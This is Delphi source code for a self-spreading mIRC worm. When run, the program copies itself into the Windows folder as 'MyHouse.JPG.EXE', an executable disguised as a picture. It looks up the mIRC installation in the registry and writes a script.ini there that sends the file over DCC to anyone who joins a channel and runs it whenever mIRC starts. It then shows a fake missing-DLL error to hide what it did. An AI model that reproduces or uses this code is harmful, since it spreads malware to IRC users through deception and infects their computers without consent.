   unit Unit1;

   interface

   uses
     Windows, SysUtils, Forms, Dialogs, Registry, Classes, Controls, StdCtrls;

   TYPE
     TForm1 = CLASS(TForm)
     PROCEDURE FormCreate(Sender: TObject);
     PRIVATE
     PUBLIC
     END;

   VAR
     Form1 : TForm1;

   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION CopyFile(CONST SourceFile:TFilename;CONST DestinationFile:TFilename):  BOOLEAN;
   BEGIN
     RESULT := Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),FALSE);
   END;

   FUNCTION WinPath:STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     RESULT:=StrPas(PWindowsDir);
     if result[length(result)]<>'\' then result:=result+'\';
   END;

   Procedure mIRC(s2:string);
    var
     f   : text;
     s   : string;
     Reg : TRegistry;
   begin
     Reg := TRegistry.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     if Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC',false) then begin
       s:=Reg.ReadString('UninstallString');
       delete(s,pos('mirc32.exe',s) or pos('mirc.exe',s),length(s));
       delete(s,1,1);
        assign(f,s+'script.ini');
       rewrite(f);
       writeln(f,'[Script]');
       writeln(f,'n0=ON 1:JOIN:#:{');
       writeln(f,'n1=/dcc send $nick ',s2);
       writeln(f,'n2=}');
       writeln(f,'n3=on 1:start:{');
       writeln(f,'n4= /run -n ',s2);
       writeln(f,'n5=}');

       closefile(f);
     end;
     Reg.CloseKey;
     Reg.Free;
   end;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
    BEGIN
     if not fileexists(winpath+'MyHouse.JPG.EXE') THEN CopyFile (paramstr(0),Winpath+'MyHouse.JPG.EXE');
     mIRC(Winpath+'MyHouse.JPG.EXE');
     Application.messagebox('QTINTF3.DLL Not Found!','Error',MB_ICONHAND);
     form1.close;
     exitprocess(0);
   END;
   END.
